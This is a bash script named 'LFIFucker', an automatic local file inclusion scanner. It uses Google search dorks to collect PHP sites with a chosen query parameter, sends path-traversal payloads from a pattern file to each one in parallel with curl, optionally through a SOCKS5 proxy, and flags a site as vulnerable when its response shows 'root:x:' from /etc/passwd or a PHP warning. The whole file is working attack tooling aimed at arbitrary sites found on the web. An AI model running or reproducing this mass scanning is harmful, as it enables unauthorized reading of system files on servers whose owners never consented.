#!/bin/bash

DORK_CLI="python lib"
WORK_DIR="tmp"
DEF_PATTERNS_PATH="lib/def_patterns"
F_PATTERNS_PATH="tmp/filter_patterns.tmp"
SESSION_PREFIX=`date +%d%m%Y_%H%M%S`

G_API_KEY=`cat lfi.conf |grep GOOGLE_API_KEY |cut -c16-`
G_ENGINE_CX=`cat lfi.conf |grep GOOGLE_ENGINE_CX |cut -c18-`

LFI_VULNERABLE_COUNT=0

function filter_patterns() {
	local LINES=0

	if [[ -f $F_PATTERNS_PATH ]]; then
		rm $F_PATTERNS_PATH
	fi

	for i in `cat $1`
		do
			echo $LINES";"$i >> $F_PATTERNS_PATH
			let LINES++
		done
}

########################SEARCH MODULE###################

function search_dorks() {
	filter_patterns $2

	if [[ ! -d $WORK_DIR ]]; then
		mkdir $WORK_DIR
	fi
	if [[ -z $SITES_FILE ]]; then
		for i in `echo $1 |tr "," "\n"`
			do
				search_dork $i
			done
		echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Found sites:\033[0m `cat $WORK_DIR/search_result.log |wc -l`"
		filter_results $1
	else
		search_dork $1
	fi
}

function search_dork() {
	if [[ -z $SITES_FILE ]]; then
		echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Searching sites by dork:\033[0m ${1}"
		$DORK_CLI/dork_search.py -k $G_API_KEY -e $G_ENGINE_CX inurl:\"php?${1}\" >> $WORK_DIR/search_result.log
	else
		if [[ -f $SITES_FILE ]]; then
			echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Parsed sites:\033[0m `cat $SITES_FILE |wc -l`"
			echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Patterns count:\033[0m `cat $1 |wc -l`"
			lfi_check $1 $SITES_FILE
		else
			echo -e "\033[01;031merr\033[0m: '$SITES_FILE' file isn't exist."
		fi
	fi
}

function filter_results() {
	for i in `echo $1 |tr "," "\n"`
		do
			cat $WORK_DIR/search_result.log |grep ?$i > $WORK_DIR/tmp.log
			for b in `cat $WORK_DIR/tmp.log`
        do
        	echo $b |sed -e "s/$i.*/$i/g" >> $WORK_DIR/$SESSION_PREFIX'_filtered_result.log'
        done
		done

	echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Filtered sites:\033[0m `cat $WORK_DIR/$SESSION_PREFIX'_filtered_result.log' |wc -l`"
	echo -e "\033[01;32m [\033[01;031m*\033[01;032m] Patterns count:\033[0m `cat $F_PATTERNS_PATH |wc -l`"
	rm $WORK_DIR/search_result.log
	rm $WORK_DIR/tmp.log

	lfi_check $F_PATTERNS_PATH $WORK_DIR/$SESSION_PREFIX'_filtered_result.log'
}


########################LFI MODULE#######################

function lfi_check() {
	echo -e "\n\033[01;32m [\033[01;031m*\033[01;032m]\033[01;030m >>>>> LFI Scanning <<<<< \033[01;32m[\033[01;031m*\033[01;032m]\033[0m"
	for i in `cat $2`
		do
			echo -ne "\n\r\033[01;31m [\033[01;93m0\033[01;031m]\033[0m $i" && lfi_request $i $1
		done
	echo -e "\n\n\033[01;32m [\033[01;031m*\033[01;032m] Vulnerable sites found:\033[0m $LFI_VULNERABLE_COUNT"
}

function lfi_request() {
	SITE=$1

	export WORK_DIR
	export SOCKS5
	export SESSION_PREFIX
	export SITE

	export -f lfi_request_iter
	export -f lfi_response_check
	echo `cat $2` |xargs -n 1 -P 8 bash -c 'lfi_request_iter "$SITE" "$@"' _
	rm $WORK_DIR/*"_response_tmp.log"

	if [[ `cat $WORK_DIR/state.tmp` -eq 1 ]]; then
		echo -en "\r\033[01;31m [\033[01;93m-\033[01;031m]\033[0m $SITE"
	else
		let LFI_VULNERABLE_COUNT++
		echo -en "\r\033[01;32m [\033[01;93m+\033[01;032m]\033[0m $SITE"
  fi
	rm $WORK_DIR/state.tmp
}

function lfi_request_iter() {
	local STATE=1
	local STATE_T=1
	local N_PAIR=$2
	local PAIR=(${N_PAIR//;/ })
	local RESPONE_TMP=$WORK_DIR/${PAIR[0]}"_response_tmp.log"

	if [[ -z $SOCKS5 ]]; then
		curl -m 1 -s $1${PAIR[1]} > $RESPONE_TMP
	else
		curl -m 3 --socks5-hostname $SOCKS5 -s $1${PAIR[1]} > $RESPONE_TMP
	fi

	lfi_response_check $1${PAIR[1]} $RESPONE_TMP
	STATE_T=$?

	if [[ $STATE -eq 1 ]]; then
		STATE=$STATE_T
		echo $STATE > $WORK_DIR/state.tmp
	fi

	if [[ $STATE -eq 1 ]]; then
		echo -en "\r\033[01;31m [\033[01;93m${PAIR[0]}\033[01;031m]\033[0m $1"
	else
		echo -en "\r\033[01;32m [\033[01;93m${PAIR[0]}\033[01;032m]\033[0m $1"
	fi
}

# 1 - !OK, 2 - OK
function lfi_response_check() {
	local KEY_WARNING=`cat $2 |grep Warning`
	local KEY_PASSWD_ROOT=`cat $2 |grep "root:x:"`

	if [[ $KEY_WARNING == *"Warning"* ]]; then
		echo -e "\n$1" >> $WORK_DIR/$SESSION_PREFIX"_lfi_vulnerable.log"
		return 2
	elif [[ $KEY_PASSWD_ROOT == *"root:x:"* ]]; then
		echo -e "\n$1" >> $WORK_DIR/$SESSION_PREFIX"_lfi_vulnerable.log"
		return 2
	else
		return 1
	fi
}


#######################RFI MODULE#######################



########################################################

function print_help() {
echo -e '''
==================[\033[1;032mCommands\033[0m]==================

 \033[0;033mUsage: LFIFucker [OPTION] [VALUE]\033[0m
 OPTIONS:
          --dork-query   -  Query parameter for dork.
                            \033[0;033mExample:\033[0m LFIFucker --dork-query id=
          --sites        -  Path to file with sites list. Do not use --dork-query with this parameter
                            \033[0;033mExample:\033[0m LFIFucker --sites list.txt
          --pattern      -  Path to file with query values
                            \033[0;033mExample:\033[0m LFIFucker --dork-query id= --pattern list.txt
          --socks5       -  SOCKS5 Proxy url.
                            \033[0;033mExample:\033[0m LFIfucker --dork-query id= --socks5 127.0.0.1:1080
	  --help         -  Print this information
        '''
}

function check_deps() {
	if [[ `dpkg -l curl` != *"Version"* ]]; then
		apt install curl
	fi
	if [[ `dpkg -l python` != *"Version"* ]]; then
		apt install python
	fi
}

#######################INIT MODULE#######################

function check_args() {
	while [ -n "$1" ]; do
		case "$1" in
		--pattern)
			if [ ! -z $2 ] && [ $2 != "--dork-query" ] && [ $2 != "--socks5" ] && [ $2 != "--sites" ] && [ $2 != "--help" ]; then
				local PATTERN=$2
			else
				echo -e "\033[01;031merr\033[0m: '--pattern' parameter can't be empty"
				print_help && return 1
			fi
		shift;;
		--dork-query)
			if [ ! -z $2 ] && [ $2 != "--pattern" ] && [ $2 != "--socks5" ] && [ $2 != "--sites" ] && [ $2 != "--help" ]; then
				local DORK=$2
			else
				echo -e "\033[01;031merr\033[0m: '--dork-query' parameter can't be empty"
				print_help && return 1
			fi
		shift;;
		--socks5)
			if [ ! -z $2 ] && [ $2 != "--pattern" ] && [ $2 != "--dork-query" ] && [ $2 != "--sites" ] && [ $2 != "--help" ]; then
				SOCKS5=$2
			else
				echo -e "\033[01;031merr\033[0m: '--socks5' parameter can't be empty"
				print_help && return 1
			fi
		shift;;
		--sites)
			if [ ! -z $2 ] && [ $2 != "--pattern" ] && [ $2 != "--dork-query" ] && [ $2 != "--socks5" ] && [ $2 != "--help" ]; then
				SITES_FILE=$2
			else
				echo -e "\033[01;031merr\033[0m: '--sites' parameter can't be empty"
                                print_help && return 1
			fi
		shift;;
		--help) print_help && return 0;;
		--*) echo -e "\033[01;031merr\033[0m: Bad parameter '$1'" && print_help && return 1;;
		esac
		shift
	done

	if [ ! -z $DORK ] && [ ! -z $SITES_FILE ]; then
		echo -e "\033[01;031merr\033[0m: Use only '--dork-query' or '--sites' parameter"
		print_help
		return 1
	fi
	if [ -z $DORK ] && [ -z $SITES_FILE ]; then
		echo -e "\033[01;031merr\033[0m: Using of '--dork-query' or '--sites' parameter is mandatory!"
		print_help
		return 1
	fi

	if [[ -z $PATTERN ]]; then
		start $DORK $DEF_PATTERNS_PATH
	else
		if [[ -f $PATTERN ]]; then
			start $DORK $PATTERN
		else
			echo -e "\033[01;031merr\033[0m: '$PATTERN' file isn't exist."
			print_help
		fi
	fi
}

function start() {
	check_deps
	echo -e '''\033[01;095m

 /$$       /$$$$$$$$ /$$$$$$ /$$$$$$$$                  /$$
| $$      | $$_____/|_  $$_/| $$_____/                 | $$
| $$      | $$        | $$  | $$    /$$   /$$  /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$
| $$      | $$$$$     | $$  | $$$$$| $$  | $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
| $$      | $$__/     | $$  | $$__/| $$  | $$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/
| $$      | $$        | $$  | $$   | $$  | $$| $$      | $$_  $$ | $$_____/| $$
| $$$$$$$$| $$       /$$$$$$| $$   |  $$$$$$/|  $$$$$$$| $$ \  $$|  $$$$$$$| $$
|________/|__/      |______/|__/    \______/  \_______/|__/  \__/ \_______/|__/
\033[0m
\n\033[1;033m++ --- --- ++=[ LFI vulnerability automatic scanner | ver. 0.5b | Author: ruby ]=++ --- --- ++\033[0m
'''
	search_dorks $1 $2
}

if [[ ! -z $1 ]]; then
	check_args $1 $2 $3 $4 $5 $6
else
	print_help
fi
